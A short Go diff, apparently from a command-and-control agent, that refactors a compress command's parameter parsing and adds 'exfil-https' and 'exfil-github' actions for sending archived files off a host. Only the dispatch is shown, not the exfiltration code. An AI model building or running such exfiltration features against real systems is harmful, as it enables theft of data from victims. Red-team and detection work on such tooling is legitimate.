@@ -2,7 +2,6 @@ package commands
 
 import (
 	"archive/zip"
-	"encoding/json"
 	"fmt"
 	"io"
 	"io/fs"
@@ -54,9 +53,9 @@ func detectFormat(params CompressParams) string {
 }
 
 func (c *CompressCommand) Execute(task structs.Task) structs.CommandResult {
-	var params CompressParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := requireParams[CompressParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if params.MaxDepth == 0 {
@@ -90,8 +89,12 @@ func (c *CompressCommand) Execute(task structs.Task) structs.CommandResult {
 		return compressExfil(task, params)
 	case "stage-exfil":
 		return compressStageExfil(task, params)
+	case "exfil-https":
+		return compressExfilHTTPS(task, params)
+	case "exfil-github":
+		return compressExfilGitHub(task, params)
 	default:
-		return errorf("Unknown action: %s (use 'create', 'list', 'extract', 'stage', 'exfil', or 'stage-exfil')", params.Action)
+		return errorf("Unknown action: %s (use 'create', 'list', 'extract', 'stage', 'exfil', 'stage-exfil', 'exfil-https', or 'exfil-github')", params.Action)
 	}
 }
 
